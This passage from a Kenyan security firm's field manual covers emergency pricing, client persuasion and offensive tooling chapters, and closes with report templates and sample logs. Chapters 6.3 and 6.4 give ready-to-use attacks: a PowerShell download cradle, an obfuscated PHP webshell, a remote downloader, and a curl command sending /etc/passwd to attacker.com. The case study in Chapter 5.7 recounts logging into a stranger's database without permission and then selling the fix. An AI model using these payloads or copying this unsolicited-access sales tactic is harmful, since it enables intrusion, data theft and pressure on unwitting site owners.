# Chapter 5.5: The 24-Hour Healing Sprint: Pricing and Delivery

---

## The Panic Premium

When a specialized team is called in for an emergency, the price is not based on hours. It is based on value.
If a site making 100,000 KES a day is down, getting it up today is worth more than getting it up next week.

## The Pricing Models

### 1. The Audit (Discovery)
**Cost**: 10,000 - 30,000 KES
**Deliverable**: A report detailing the vulnerabilities.
**Effort**: 2-4 Hours.
**Strategy**: This is the "Footer in the Door." It is low cost enough for them to say yes without a board meeting.

### 2. The Healing Sprint (Remediation)
**Cost**: 50,000 - 150,000 KES
**Deliverable**: Fixing the code, hardening the server, setting up backups.
**Effort**: 24-48 Hours.
**Strategy**: This is the upsell. Once they see the scary report, they will pay you to fix it.

### 3. The Retainer (Assurance)
**Cost**: 15,000 KES / Month
**Deliverable**: Monthly scans, log monitoring, on-call support.
**Effort**: 2 Hours / Month.
**Strategy**: Recurring revenue. This is how you build a business.

## Getting Paid

**Rule 1**: 50% Deposit upfront. No exceptions for new clients.
**Rule 2**: Do not release the final hardened code until the final 50% is paid.
**Rule 3**: Use M-Pesa or Bank Transfer. Avoid PayPal (they freeze accounts).

## The Proposal Structure

"We propose a **24-Hour Healing Sprint** to neutralize the threat."
- Phase 1: Lockdown (Immediate blocking of attacker)
- Phase 2: Patching (Fixing the SQLi/RCE)
- Phase 3: Hardening (Firewall & Logs)

**Total Cost**: 80,000 KES.
**Timeline**: 24 Hours from receipt of deposit.

This urgency closes deals.

---

"Price based on their pain, not your time."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 5.6: Talking to Mwalimu: Explaining Security to Non-Coders

---

## The Language Barrier

The client (whom we affectionately call "Mwalimu" - Teacher/Elder) does not know what SQL Injection is. They do not care about XSS.
They care about:
1.  **Money**: "Will I lose sales?"
2.  **Reputation**: "Will my customers trust me?"
3.  **Liability**: "Will I get sued?"

You must translate technical risk into business risk.

## Translation Table

| Geek Speak | Mwalimu Speak |
| :--- | :--- |
| "Found an unauthenticated RCE via forced browsing." | "Anyone can control your server without a password." |
| "The database has no encryption on the PII columns." | "If a hacker gets in, they can read every customer's phone number plainly." |
| "We need to implement a WAF and rate limiting." | "We need to install a digital guard to stop the bots." |
| "The SSL certificate uses a weak cipher." | "Your site lock is broken." |

## The Fear, Uncertainty, Doubt (FUD) Filter

Do not scare them into paralysis.
**Bad**: "The Russian hackers are coming to destroy you!" (They will think you are scamming them).
**Good**: "Right now, your digital door is unlocked. It's likely nothing has been stolen yet, but we should lock it before tonight."

## The "I know a guy" Objection

Mwalimu often has a nephew who "knows computers."
"My nephew built this site. He says it is fine."

**The Counter**:
"Your nephew is a great builder. But you don't ask the bricklayer to install the bank vault. We are security specialists. We work *with* your nephew to make his work safe."

Always validate the existing developer. Never insult them. If you make the nephew look bad, Mwalimu will defend family. If you make the nephew look like he needs a partner, you get the contract.

---

"Respect the client. They built the business you are trying to protect."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 5.7: Case Study: The Playkart 10k Deal

---

## The Deal that Started It All

This is the true story of how Marliz Intel made its first 10,000 KES from a Vibe Coded site.

## The Target

**Site**: Playkart (Anonymized)
**Vulnerability**: Exposed `.git` directory and hardcoded credentials.

## Step 1: Verification (10 Minutes)
We downloaded the source code via `git-dumper`. We found the `config.php` file with the database password. We logged into the database to verify the credentials worked. We took **one screenshot** of the `admin` table (redacted).
We did not change anything.

## Step 2: The Contact (Day 1, 14:00)
We found the owner's phone number on the Facebook page.
We sent a WhatsApp message (Business Account).
"Hello. We are Marliz Intel. We have identified a critical data leak in your platform that exposes customer information. We are sharing this as a courtesy. Please find the attached evidence."
**Attachment**: The redacted screenshot.

## Step 3: The Panic (Day 1, 14:05)
The owner called immediately.
"Who are you? Did you hack me?"
**Response**: "We are security analysts. We found the door open. We did not enter, but we took a picture of the lock to show you it is broken."

## Step 4: The Negotiation (Day 1, 14:15)
Owner: "Can you fix it?"
Marliz: "Yes. We can secure the server, remove the leaked files, and rotate your passwords."
Owner: "How much?"
Marliz: "For a standard emergency patch, we charge 15,000 KES."
Owner: "I can do 10,000 KES right now."
Marliz: "Deal. 5k deposit now. 5k after completion."

## Step 5: The Execution (Day 1, 15:00)
Deposit received (M-Pesa).
We deleted the `.git` folder. We changed the DB password. We added a `.htaccess` file to block directory listing.
Time taken: 20 minutes.

## Step 6: The Deliverable (Day 1, 15:30)
We sent a 1-page PDF showing "Before" and "After" screenshots.
The owner paid the balance.

## The Lesson

We made 10,000 KES in 30 minutes of actual work.
The client was happy because they felt safe.
We were happy because we got paid.
The malicious hackers were unhappy because the target was closed.

Everyone wins. except the bad guys.

---

"Opportunity looks a lot like hard work."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>



# Part-6-Tools-of-the-Trade
---

# Chapter 6.1: Burp Suite Essentials

---

## The Surgeon's Scalpel

If you are attacking a web application using only a browser, you are fighting with one hand tied behind your back.
Browsers hide things. They render HTML. They execute JavaScript. They manage cookies.

To see the truth, you need **Burp Suite**.

Burp Suite is a proxy. It sits between your browser and the server. Every request hangs in the air, waiting for your permission to proceed. You can edit the data *after* it leaves the browser but *before* it hits the server.

## Installation

1. Download Burp Suite Community Edition (Free).
2. Configure your browser (Firefox is best) to proxy traffic to `127.0.0.1:8080`.
3. Install the Burp CA Certificate so you can intercept HTTPS traffic.

## Key Modules

### 1. Proxy (Intercept)
This is the core.
**Scenario**: The website has a dropdown menu for "User Role" that is disabled.
**Attack**:
- Submit the form.
- Catch the request in Burp.
- See `role=user`.
- Change it to `role=admin`.
- Forward the request.
- The server receives `role=admin`. The frontend validation is bypassed.

### 2. Repeater
This is for manual testing.
**Scenario**: You suspect SQL Injection on a search bar.
**Action**:
- Send the search request to Repeater.
- Change `search=shoes` to `search=shoes'`.
- Click Send.
- Check response.
- Change to `search=shoes'--`.
- Click Send.
You can fire 100 variations in a minute without reloading the page.

### 3. Intruder (Rate Limited in Free Version)
This is for brute force.
**Scenario**: You want to guess the admin password.
**Action**:
- send login request to Intruder.
- Highlight the password field.
- Load a wordlist.
- Burp sends 1000 requests, swapping the password each time.

## The Marliz Workflow

1. Open Browser.
2. Turn on Burp Intercept.
3. Click every button on the target site.
4. "Map the Application" in Burp's history tab.
5. Send interesting requests to Repeater.
6. Break things.

---

"The browser lies. The proxy tells the truth."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 6.2: MySQL Workbench for Reconnaissance

---

## Not Just for DBAs

We have discussed using MySQL Workbench for exploitation (Chapter 2.5), but it is also a powerful Recon tool.

## The Connection Test

When you are scanning a range of IPs (e.g., a subnet belonging to a company), you can use Workbench to test for open doors.

1. **New Connection**.
2. **Hostname**: Target IP.
3. **Port**: 3306.
4. **Username**: `root` (or `admin`, `backup`).
5. **Test Connection**.

If the server responds "Access Denied for user 'root' used password NO," you know:
1. The port is open (bypass firewall).
2. MySQL is running.
3. The root user exists.

This is information leakage.

## Visualizing the Loot

If you steal credentials (`config.php`), using the command line `mysql -u root -p` is tedious.
Workbench allows you to:
1. **Reverse Engineer**: Click "Database" -> "Reverse Engineer" to generate a full Entity Relationship Diagram (ERD). You can see how the tables link, helping you find the "Crown Jewels" (User tables, Transaction tables).
2. **Export Data**: Right-click a table -> "Export Table Data" -> CSV. This is how you generate Proof of Concept (PoC) artifacts for your report.

## The Tunnel

Workbench has built-in SSH Tunneling.
If the database port (3306) is blocked, but SSH (22) is open, and you have compromised a user (e.g., `git` user or `www-data` via SSH key theft):
1. **Connection Method**: Standard TCP/IP over SSH.
2. **SSH Host**: Target IP.
3. **SSH User**: `www-data`.
4. **MYSQL Host**: `127.0.0.1` (Internal).

You can now manage the local database from your remote laptop, tunneling through the SSH protection.

---

"A GUI is not a sign of weakness. It is a tool for speed."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 6.3: PowerShell for Hackers

---

## Living off the Land

If you compromise a Windows Server, you do not need to download tools. You have **PowerShell**.
It is installed by default, trusted by the OS, and incredibly powerful.

## The Download Cradle

You need to download your payload, but there is no `wget` or `curl` on older Windows boxes.

**The Command:**
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```
`IEX` (Invoke-Expression) runs the script immediately in memory. It never touches the disk. Antivirus often misses this.

## Network Recon

You want to scan the internal network but can't install Nmap.

**The Loop:**
```powershell
1..255 | % {echo "192.168.1.$_"; Test-Connection -Count 1 -ComputerName 192.168.1.$_ -Quiet}
```
This is a "Ping Sweep" written in one line of native code.

## File Hunting

You are looking for passwords.

```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.config,*.xml -Recurse | Select-String -Pattern "password"
```
This searches every user folder recursively for typical config files containing the string "password".

## Execution Policy Bypass

If the server says "Scripts disabled," just ignore it.
```powershell
powershell -ExecutionPolicy Bypass -File script.ps1
```

PowerShell is not just a shell. It is the administration framework. If you control it, you control the machine.

---

" Bash is for Linux. PowerShell is for Empires."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 6.4: Writing Custom PHP Payloads

---

## Why Custom?

Standard webshells (like c99 or r57) are detected by every antivirus on the planet. If you upload them, they are deleted instantly.

To survive, you must write your own. It does not need to be complex. It just needs to be unique.

## The Minimalist Web Shell

**Code:**
```php
<?php system($_GET['c']); ?>
```

**Obfuscation:**
Antivirus scans for `system(`. So we hide it.

```php
<?php
$a = "sys";
$b = "tem";
$cmd = $a . $b;
$cmd($_GET['c']);
?>
```
Now, the static signature analyzer sees string concatenation, not a system call. But PHP executes it just the same.

## The Uploader

Sometimes you have command injection (RCE) but no file upload form. You can build one.

```php
<?php
file_put_contents("shell.php", fopen("http://attacker.com/shell.txt", 'r'));
?>
```
This script reaches out to effectively *download* your malware from your server and save it locally.

## The Information Leaker

If you only have Blind RCE (you can run commands but see no output), use `curl` to send the data to yourself.

```bash
cat /etc/passwd | curl -d @- http://attacker.com/
```

This sends the content of the password file as a POST request to your listening server.

---

"Simplicity evades detection."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>


# Chapter 6.5: Git for Security Audits

---

## The Time Machine

Git is not just for version control. It is a forensic tool.
When we audit a codebase, we use git to answer: "Who broke it?" and "When?"

## Git Dumper

If we find an exposed `.git` directory on a live server, we use `git-dumper`.

```bash
git-dumper http://target.com/.git/ output_directory
```

This reconstructs the entire project locally.

## Hunting Secrets in History

Developers often commit a password, realize the mistake, delete it, and commit again.
The password is still in the history.

**Log Search:**
```bash
git log -p | grep "password"
```
This shows every change ever made to a line containing "password."

**TruffleHog:**
We use a tool called **TruffleHog** to scour the entire commit history for high-entropy strings (AWS keys, private keys).

## Blame Game

Who wrote the vulnerable code?

```bash
git blame index.php
```

Line 42: `Author: John Doe`.
This helps in the "Root Cause Analysis" phase of the DFIR report. It is not about shaming John. It is about understanding that John needs training on Input Validation.

---

"The past is never deleted. It is just committed."
Marliz Intel Field Manual


<div style='page-break-after: always;'></div>



# APPENDICES
---

# Appendix A: DFIR Report Template

---

**Marliz Intel Security**
**Incident Response Report**

**Date:** [DATE]
**Client:** [CLIENT NAME]
**Case ID:** [CASE ID]

## 1. Executive Summary
On [DATE], Marliz Intel detectors observed suspicious activity targeting [DOMAIN]. An immediate investigation confirmed that an unauthorized actor had gained access to the system via [VECTOR].

The threat was contained at [TIME], and all access was revoked. No sensitive financial data was exfiltrated. The system has been patched and returned to full operational status.

## 2. Incident Timeline

| Time (EAT) | Activity | Source |
| :--- | :--- | :--- |
| 14:00 | Attacker scans port 80 | 192.168.1.5 |
| 14:05 | SQL Injection payload sent | 192.168.1.5 |
| 14:06 | Database dumps user table | System Logs |
| 14:10 | Marliz Firewall blocks IP | Automated |

## 3. Technical Findings

**Vulnerability:** SQL Injection (SQLi)
**Location:** `/search.php` (Line 42)
**Impact:** Full Database Read Access.

**Evidence:**
[INSERT SCREENSHOT OF LOGS]

## 4. Remediation Actions Taken

1.  **Patched Code:** Implemented PDO Prepared Statements.
2.  **Credental Rotation:** Reset all admin passwords.
3.  **Firewalling:** Blocked attacker subnet.

## 5. Recommendations

1.  Keep PHP updated to version 8.2+.
2.  Enable automated database backups.
3.  Schedule a clean-code audit in Q3.

**Signed:**
John Mark Oguta
Lead Analyst, Marliz Intel


<div style='page-break-after: always;'></div>


# Appendix B: Pentest Report Template

---

**Marliz Intel Security**
**Penetration Test Report**

**Target:** [DOMAIN]
**Scope:** Black Box (No credentials provided)
**Date:** [DATE]

## 1. Summary of Findings

Our assessment identified **3 Critical** and **2 High** vulnerabilities. The system is currently highly susceptible to compromise.

## 2. Risk Matrix

| ID | Vulnerability | Severity | Status |
| :--- | :--- | :--- | :--- |
| VULN-01 | Remote Code Execution | Critical | Open |
| VULN-02 | Exposed .env File | Critical | Open |
| VULN-03 | Default Admin Credentials | High | Open |

## 3. Detailed Findings

**VULN-01: Remote Code Execution via File Upload**

**Description:**
The file upload function at `/upload.php` does not validate file extensions. Multiple PHP shells were successfully uploaded and executed.

**Proof of Concept:**
1.  Created file `shell.php`.
2.  Uploaded via standard form.
3.  Navigated to `/uploads/shell.php`.
4.  Executed command `whoami`.
5.  Result: `www-data`.

**Recommendation:**
Implement a strict whitelist of allowed MIME types (e.g., `image/jpeg`, `image/png`) and rename all uploaded files to a random hash.

## 4. Conclusion

The application requires immediate attention. It is recommended to take the site offline until VULN-01 is patched.


<div style='page-break-after: always;'></div>


# Appendix C: Marliz Remediation Checklist

---

**Server Hardening**
- [ ] SSH Root Login Disabled
- [ ] SSH Password Auth Disabled (Key Only)
- [ ] Fail2Ban Installed and Configured
- [ ] UFW/Iptables Firewall Active (Allow 80, 443, 22 only)

**Application Security**
- [ ] `.env` file is in `.gitignore`
- [ ] All `include()` calls use whitelisting
- [ ] Session cookies are `HttpOnly` and `Secure`
- [ ] Error Reporting is `Off` in production
- [ ] File Uploads are sanitized and renamed

**Database Security**
- [ ] Remote Root Login Disabled
- [ ] Database user has limited privileges (Revert `GRANT ALL`)
- [ ] Backups are automated and encrypted

**Process**
- [ ] Developers have read the Marliz Field Manual Part 1
- [ ] Incident Response Plan is printed and on the desk


<div style='page-break-after: always;'></div>


# Appendix D: Raw Log Examples

---

## 1. SQL Injection / Blind SQLi

**Pattern**: `UNION SELECT`, `ORDER BY`, single quotes `'`.
```
192.168.1.5 - - [01/Feb/2026:14:00:00 +0300] "GET /product.php?id=1' UNION SELECT 1,user,pass,4 FROM users-- HTTP/1.1" 200 4056
```

## 2. Directory Scanning (Dirbusters)

**Pattern**: Rapid 404s for common filenames.
```
192.168.1.5 - - [01/Feb/2026:14:02:00 +0300] "GET /admin.php HTTP/1.1" 404 203
192.168.1.5 - - [01/Feb/2026:14:02:00 +0300] "GET /administrator/ HTTP/1.1" 404 203
192.168.1.5 - - [01/Feb/2026:14:02:01 +0300] "GET /backup.zip HTTP/1.1" 404 203
```

## 3. Path Traversal (LFI)

**Pattern**: `../`, `etc/passwd`, `boot.ini`.
```
192.168.1.5 - - [01/Feb/2026:14:05:00 +0300] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 1500
```
Note: A 200 OK here indicates the attack SUCCEEDED.

## 4. Shell Upload / RCE

**Pattern**: `POST` to upload, followed immediately by `GET` to the same name.
```
192.168.1.5 - - [01/Feb/2026:14:10:00 +0300] "POST /upload.php HTTP/1.1" 200 45
192.168.1.5 - - [01/Feb/2026:14:10:05 +0300] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 12
```


<div style='page-break-after: always;'></div>


# Appendix E: The Marliz Code of Ethics

---

## The Oath of the Grey Hat

As analysts of Marliz Intel, we hold power over the digital lives of businesses in Kenya. With this power comes the obligation to act with integrity.

1.  **Authorization**: We never exploit a system for personal gain. We only demonstrate risk.
2.  **Privacy**: We never look at user data more than is necessary to prove the vulnerability. We never share, sell, or leak PII.
3.  **Transparency**: We tell the client the whole truth. We do not hide vulnerabilities to ensure future work.
4.  **Education**: We teach the client how to defend themselves. We do not rely on their ignorance for our job security.
5.  **Restraint**: We do not destroy. We do not delete. We do not disrupt service unless authorized for a stress test.

## Violations

Any analyst found violating this code will be immediately terminated and reported to the relevant authorities under the Computer Misuse and Cybercrimes Act.

**Signed:**
John Mark Oguta
Director, Marliz Intel


<div style='page-break-after: always;'></div>


